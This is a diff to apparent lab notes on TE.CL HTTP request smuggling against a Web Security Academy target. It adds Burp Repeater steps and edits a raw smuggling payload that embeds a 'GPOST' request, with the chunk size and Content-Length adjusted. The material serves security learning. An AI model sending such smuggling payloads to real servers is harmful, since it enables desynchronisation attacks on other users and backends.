@@ -10,6 +10,7 @@ HACKED
 ```
 Now send both request one by one and see error message in second request's response. 
 ### TE.CL
+Send a GET request in repeater and convert it to POST. Add Transfer-Encoding header and construct a GPOST payload. Count content length after GPOST to \r\n and add +1 with totall content length (In this case Content Length is 9d). Set Content-Length of POST request 2+2 = 4 (where c.l of 9d = 2). Uncheck Update c.l in burp repeater and send the request twice. Now, you can see "Unrecognized method GPOST" which means this target is vulnerable to smuggling.
 ```txt
 POST / HTTP/1.1
 Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
@@ -30,13 +31,13 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 4
 Transfer-Encoding: chunked
 
-a8
+9d
 GPOST / HTTP/1.1
 Host: 0a5100c4035607e984f33b25009300f5.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 50
+Content-Length: 15
 
-HMCyberAcademy
+x=1
 0
 
 
